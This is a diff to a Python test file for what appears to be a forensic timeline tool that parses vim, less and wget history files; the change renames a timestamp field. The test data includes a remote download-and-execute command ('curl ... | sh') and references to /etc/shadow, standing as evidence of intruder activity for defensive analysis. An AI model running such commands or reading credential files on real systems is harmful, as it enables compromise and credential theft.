@@ -78,18 +78,18 @@ def _rows(tmp_path: Path, files: dict[str, str], tools: str = "") -> list[dict]:
 
 def test_vim_commands_searches_and_files_with_their_times(tmp_path):
     rows = _rows(tmp_path, {".viminfo": VIMINFO})
-    got = {(r["kind"], r["value"]): r["time_utc"] for r in rows}
+    got = {(r["kind"], r["value"]): r["timestamp_utc"] for r in rows}
     assert got[("command", "!curl http://203.0.113.5/x.sh | sh")] == "2023-11-14 22:18:20"
     assert got[("search", "password")] == "2023-11-14 22:15:00"
     assert got[("file", "/home/jdoe/notes.txt")] == "2023-11-14 22:14:10"
     # marks and jumplist name /etc/shadow twice: one row, the newest time
-    assert [r for r in rows if r["value"] == "/etc/shadow"][0]["time_utc"] == "2023-11-14 22:21:40"
+    assert [r for r in rows if r["value"] == "/etc/shadow"][0]["timestamp_utc"] == "2023-11-14 22:21:40"
     assert sum(r["value"] == "/etc/shadow" for r in rows) == 1
 
 
 def test_an_old_viminfo_without_times_still_reads(tmp_path):
     rows = _rows(tmp_path, {".viminfo": OLD_VIMINFO})
-    assert [(r["kind"], r["value"], r["time_utc"]) for r in rows] == [
+    assert [(r["kind"], r["value"], r["timestamp_utc"]) for r in rows] == [
         ("command", "set nu", ""), ("file", "/home/jdoe/old.txt", "")]
 
 
@@ -114,7 +114,7 @@ def test_less_searches_and_shell_commands(tmp_path):
 
 def test_wget_hosts_with_their_first_time(tmp_path):
     rows = _rows(tmp_path, {".wget-hsts": HSTS})
-    assert [(r["value"], r["time_utc"]) for r in rows] == [
+    assert [(r["value"], r["timestamp_utc"]) for r in rows] == [
         ("example.org", "2023-11-14 22:23:20"), ("files.example.net:8443", "2023-11-14 22:25:00")]
 
 
